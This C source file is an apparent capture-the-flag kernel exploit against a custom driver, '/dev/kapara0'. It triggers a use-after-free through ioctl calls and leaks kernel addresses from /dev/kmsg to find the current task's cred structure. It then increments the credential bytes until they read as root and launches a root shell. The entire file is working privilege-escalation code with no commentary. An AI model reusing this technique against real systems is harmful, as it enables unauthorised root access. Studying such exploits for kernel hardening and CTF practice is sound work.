#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include<sys/socket.h>

#define DEVICE_FILE "/dev/kapara0"
#define CREATE_IDP 0x53d
#define DELETE 0x53e
#define ALLOC 0x53c
#define REGISTER 0x539
#define INCREMENT 0x53b
#define GS 0xffff88807dc00000ul
#define TASK_STRUCT_OFFSET 0x17d00
#define CRED_OFFSET 0x638
#define LEN 0x1000
#define TASK_BASE 0xffff888000000000ul

int fd,leak_fd;
char payload[0x28];

void init(){
	ioctl(fd,CREATE_IDP,0);
}
void alloc(char *data){
	ioctl(fd,ALLOC,data);
}
void assign(unsigned long id){
	unsigned long idptr=id;
	ioctl(fd,REGISTER,(char *)&idptr);
}
void delete(unsigned long id){
	char data[0x28];
	memset(data,0,sizeof(data));
	*(unsigned long *)data=id;
	ioctl(fd,DELETE,data);
}
void increment(char *addr){
	ioctl(fd,INCREMENT,addr);
}
void get_shell(){
	puts("[+] R00t shell!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}
unsigned long leak(char *target,int offset){
	char leaktxt[LEN];
	char *leaksbuf=NULL;
	int ret=1;
	while(!leaksbuf&&ret>0){
		ret=read(leak_fd,leaktxt,LEN);
		leaksbuf=strstr(leaktxt,target);
	}
	unsigned long leaks=strtoul(leaksbuf+offset,NULL,16);
	return leaks;
}
void setup(int n){
	for(int i=0;i<n;i++){
		alloc(payload);
	}
	for(int i=0;i<n;i++){
		assign(i);
	}
}
unsigned long UAFread(int index,unsigned long addr){
	delete(index);
	*(unsigned long *)(payload+0x10)=addr;
	ioctl(fd,0x541,payload);
	puts("[+] UAF chunk allocated!");
	*(unsigned long *)(payload)=index;
	ioctl(fd,0x540,payload);
	puts("[+] UAF chunk read!");
	return leak("find objid",47);
}
void UAFwrite(int n,int index,unsigned long addr,unsigned long base,unsigned long target){
	delete(index);
	*(unsigned long *)(payload+0x10)=addr;
	ioctl(fd,0x541,payload);
	puts("[+] UAF chunk allocated!");
	void *tail=mmap((void *)(base+0x100000000),0x2000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,0,0);
	memset(tail,'\x00',0x2000);
	for(int i=0;i<n;i++){
		increment((char *)(target+0x100000000));
	}
}
void exploit(){
	init();
	memset(payload,'A',0x28);
	setup(10);
	unsigned long current_task_ptr=GS+TASK_STRUCT_OFFSET;
	unsigned long current_task=UAFread(0,current_task_ptr)+TASK_BASE;
	printf("[+] current_task=%p\n",(void *)current_task);
	unsigned long cred_ptr=current_task+CRED_OFFSET;
	unsigned long cred_struct=UAFread(1,cred_ptr)+TASK_BASE;
	printf("[+] cred_struct=%p\n",(void *)cred_struct);
	unsigned long writeaddr;
	unsigned long readaddr;
	unsigned long id,id_base,n,N;
	for(int j=0;j<4;j++){
		n=3-j;
		writeaddr=cred_struct+4+n;
		readaddr=writeaddr-0x24;
		id=UAFread(2+2*j,readaddr);
		printf("[+] id=%p\n",(void *)id);
		id_base=(id>>12)<<12;
		if(n==0){
			N=0x100-0x64;
		}
		else{
			N=0xff;
		}
		UAFwrite(N,3+2*j,readaddr,id_base,id);
	}
	get_shell();
}

int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	leak_fd=open("/dev/kmsg",O_RDWR);
	exploit();
	close(leak_fd);
	close(fd);
}
